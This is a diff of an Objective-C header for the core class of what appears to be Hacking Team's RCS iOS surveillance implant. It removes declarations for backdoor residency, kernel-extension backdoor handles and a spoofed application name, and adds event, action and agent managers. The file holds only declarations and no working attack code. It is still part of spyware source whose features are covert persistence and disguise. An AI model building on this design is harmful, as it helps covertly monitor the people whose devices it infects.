@@ -1,9 +1,9 @@
 /*
- * RCSIpony - Core Header
+ * RCSiOS - Core Header
  *  pon pon
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 07/09/2009
+ * Created on 07/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -13,51 +13,35 @@
 
 #import "RCSIUtils.h"
 #import "RCSISharedMemory.h"
+#import "RCSIEventManager.h"
+#import "RCSIActionManager.h"
+#import "RCSIAgentManager.h"
 
 extern void checkAndRunDemoMode();
+
+#define CORE_STOPPED  1
+#define CORE_STOPPING 2
+#define CORE_RUNNING  4
 
 @interface RCSICore : NSObject
 {
 @private
-  // backdoor descriptor for our own device
-  int mBackdoorFD;
-  // backdoor ID returned by our kext
-  int mBackdoorID;
-  // advisory lock descriptor -- not used as of now.
-  int mLockFD;
-  
-@private
-  // executable binary name
-  NSString *mBinaryName;
-  // application bundle name (without .app)
-  NSString *mApplicationName;
-  NSString *mSpoofedName;
-  
-@private
-  NSString *mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
-  
-@private
+  uint mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
+  uint32_t          moduleStatus;
   RCSIUtils         *mUtil;
+  RCSIEventManager  *eventManager;
+  RCSIActionManager *actionManager;
+  RCSIAgentManager  *agentManager;
+  int               mLockSock;
+  pid_t             mSBPid;
 }
 
-@property (readwrite)       int mBackdoorFD;
-@property (readwrite)       int mBackdoorID;
-@property (readwrite)       int mLockFD;
-@property (readwrite, copy) NSString *mBinaryName;
-@property (readwrite, copy) NSString *mApplicationName;
-@property (readwrite, copy) NSString *mSpoofedName;
-@property (readwrite, copy) NSString *mMainLoopControlFlag;
+@property (readwrite)       uint mMainLoopControlFlag;
 @property (readonly)        RCSIUtils *mUtil;
+@property (readwrite)       pid_t mSBPid;
 
-
-- (id)initWithKey:(int)aKey
- sharedMemorySize:(int)aSize
-    semaphoreName:(NSString *)aSemaphoreName;
-
+- (id)init;
 - (void)dealloc;
-
-- (BOOL)makeBackdoorResident;
-- (BOOL)isBackdoorAlreadyResident;
 
 - (BOOL)runMeh;
 
